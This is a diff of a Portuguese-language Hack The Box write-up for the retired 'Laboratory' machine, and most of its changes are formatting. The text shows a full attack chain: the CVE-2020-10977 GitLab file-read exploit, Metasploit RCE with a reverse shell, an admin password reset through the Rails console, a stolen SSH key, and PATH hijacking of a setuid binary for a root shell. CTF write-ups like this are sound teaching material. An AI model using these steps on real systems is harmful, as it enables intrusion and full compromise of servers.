@@ -19,8 +19,10 @@ Olá pessoal!
 
 A máquina desta semana será **Laboratory**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xc45](https://app.hackthebox.eu/users/73268).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são
+  aposentadas
+</Alert>
 
 ![HTB Laboratory](https://i.imgur.com/ayRi3eJ.png)
 
@@ -29,7 +31,7 @@ A máquina desta semana será **Laboratory**, outra máquina Linux classificada 
 Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o `nmap` com um quick scan:
 
 ```bash
-$ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                   
+$ nmap -sC -sV -Pn -oA quick 10.10.10.216
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 15:50 -03
 Nmap scan report for 10.10.10.216
@@ -37,7 +39,7 @@ Host is up (0.16s latency).
 Not shown: 997 filtered ports
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
 |   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
 |_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
@@ -51,7 +53,7 @@ PORT    STATE SERVICE  VERSION
 | Subject Alternative Name: DNS:git.laboratory.htb
 | Not valid before: 2020-07-05T10:39:28
 |_Not valid after:  2024-03-03T10:39:28
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
@@ -111,14 +113,14 @@ Uma vez acessado o serviço, notado que se tratava de um servidor [GitLab](https
 Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.
 
 ```bash
-$ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                               
-{"error":"API V3 is no longer supported. Use API V4 instead."}                                           
-                                                                    
-$ curl -L https://git.laboratory.htb/api/v4/internal/check -k                                               
+$ curl -L https://git.laboratory.htb/api/v3/internal/check -k
+{"error":"API V3 is no longer supported. Use API V4 instead."}
+
+$ curl -L https://git.laboratory.htb/api/v4/internal/check -k
 {"message":"401 Unauthorized"}
 ```
 
-Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (*laboratory.htb*) mas que mesmo assim foi criada com sucesso.
+Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (_laboratory.htb_) mas que mesmo assim foi criada com sucesso.
 
 Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado **SecureWebSite**.
 
@@ -126,7 +128,7 @@ Uma vez logado com a conta recém-criada, segui para a exploração dos reposit�
 
 Ao navegar no repositório, pude notar de que se tratava do site publicado na URL `https://laboratory.htb`, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.
 
-Entretanto, uma vez logado no portal, ao acessar o menu *Help > Help* podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community
+Entretanto, uma vez logado no portal, ao acessar o menu _Help > Help_ podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community
 
 ![gitlab version](https://i.imgur.com/L1Oaxuy.png)
 
@@ -156,22 +158,22 @@ Após algumas tentativas com os scripts do searchsploit não obtive o sucesso es
 Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo `/etc/passwd`.
 
 ```bash
-$ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
-----------------------------------                                                                       
---- CVE-2020-10977 ---------------       
---- GitLab Arbitrary File Read ---               
---- 12.9.0 & Below ---------------    
-----------------------------------                                                                       
-                                                                                                         
+$ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd
+----------------------------------
+--- CVE-2020-10977 ---------------
+--- GitLab Arbitrary File Read ---
+--- 12.9.0 & Below ---------------
+----------------------------------
+
 [>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
 [>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]
-                                                                                                         
-[+] Target        : https://git.laboratory.htb                                                           
-[+] Username      : dummy                                                                                
+
+[+] Target        : https://git.laboratory.htb
+[+] Username      : dummy
 [+] Password      : P@ssw0rd
 [+] Project Names : ProjectOne, ProjectTwo
 
-[!] Trying to Login...         
+[!] Trying to Login...
 [+] Login Successful!
 [!] Creating ProjectOne...
 [+] ProjectOne Created Successfully!
@@ -187,7 +189,7 @@ $ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd
 > /etc/passwd
 ```
 
-Verificando o conteúdo do `/etc/passwd` podemos notar que os usuários desta máquina, além de *root* e *ssh* foram criados e utilizam basicamente a mesma raiz de diretório em `/var/opt/gitlab`, onde vamos buscar por arquivos interessantes
+Verificando o conteúdo do `/etc/passwd` podemos notar que os usuários desta máquina, além de _root_ e _ssh_ foram criados e utilizam basicamente a mesma raiz de diretório em `/var/opt/gitlab`, onde vamos buscar por arquivos interessantes
 
 ```bash
 $ cat etc_passwd | grep sh | awk -F":" '{print $6","$1}'
@@ -208,7 +210,7 @@ Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arb
 ```bash
 msf6 exploit(multi/http/gitlab_file_read_rce) > run
 
-[*] Started reverse TCP handler on 10.10.10.10:4444 
+[*] Started reverse TCP handler on 10.10.10.10:4444
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
 [*] Logged in to user jdoe
@@ -233,8 +235,8 @@ uid=998(git) gid=998(git) groups=998(git)
 
 Com acesso à máquina iniciada enumeração utilizando o `linpeas.sh` do [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md) que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:
 
-* Enumeração das contas, onde pudemos notar que o usuário **dexter** (`admin@example.com`) é administrador.
-* Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.
+- Enumeração das contas, onde pudemos notar que o usuário **dexter** (`admin@example.com`) é administrador.
+- Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.
 
 Um dos pontos colocados pelo `linpeas.sh` durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:
 
@@ -255,7 +257,7 @@ irb(main):003:0> user.password_confirmation = "P@ssw0rd"
 irb(main):004:0> user.save!
 Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fa424ee0668 @uri=#<URI::GID gid://gitlab/User/1>>
 => true
-irb(main):005:0> 
+irb(main):005:0>
 ```
 
 Após alterada a senha, foi possível visualizar para a conta `dexter` um repositório privado adicional chamado **SecureDocker**.
@@ -269,10 +271,10 @@ Já que temos acesso ao código-fonte do repositório, notado que existem alguns
 Após clonar o repositório para máquina local observados os seguintes arquivos.
 
 ```bash
-$ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git  
+$ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git
 Cloning into 'securedocker'...
 Username for 'https://git.laboratory.htb': dexter
-Password for 'https://dexter@git.laboratory.htb': 
+Password for 'https://dexter@git.laboratory.htb':
 warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
 remote: Enumerating objects: 10, done.
 remote: Counting objects: 100% (10/10), done.
@@ -302,8 +304,8 @@ Assim como na máquina [Luanne](/pt-BR/blog/2021/03/htb-luanne), realizado a con
 $ chmod 600 id_rsa
 $ ssh-keygen -p -m PEM -f ./id_rsa
 Key has comment 'root@laboratory'
-Enter new passphrase (empty for no passphrase): 
-Enter same passphrase again: 
+Enter new passphrase (empty for no passphrase):
+Enter same passphrase again:
 Your identification has been saved with the new passphrase.
 ```
 
@@ -324,7 +326,7 @@ drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
 -rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile
 drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
 -r--r----- 1 root   dexter   33 Feb 19 11:06 user.txt
-dexter@laboratory:~$ cat user.txt 
+dexter@laboratory:~$ cat user.txt
 <redacted>
 ```
 
@@ -344,7 +346,7 @@ dexter@laboratory:~$ file /usr/local/bin/docker-security
 /usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
 ```
 
-Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário `strings`) e algumas entradas chamaram a atenção, sendo elas a chamada do binário `chmod` para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app **é vulnerável *path hijacking***.
+Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário `strings`) e algumas entradas chamaram a atenção, sendo elas a chamada do binário `chmod` para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app **é vulnerável _path hijacking_**.
 
 ```bash
 $ strings docker-security
@@ -375,10 +377,10 @@ dexter@laboratory:~$ echo $PATH
 Após configurar um listener na porta especificada (`nc -lnvp 4443`) executado o binário `docker-security` o que retornou um shell reverso com privilégios de **root**, permitindo assim a obtenção da flag.
 
 ```bash
-$ nc -lnvp 4443                                                                                             
+$ nc -lnvp 4443
 listening on [any] 4443 ...
 connect to [10.10.10.10] from (UNKNOWN) [10.10.10.216] 44754
-root@laboratory:~# id  
+root@laboratory:~# id
 id
 uid=0(root) gid=0(root) groups=0(root),1000(dexter)
 root@laboratory:~# cat /root/root.txt
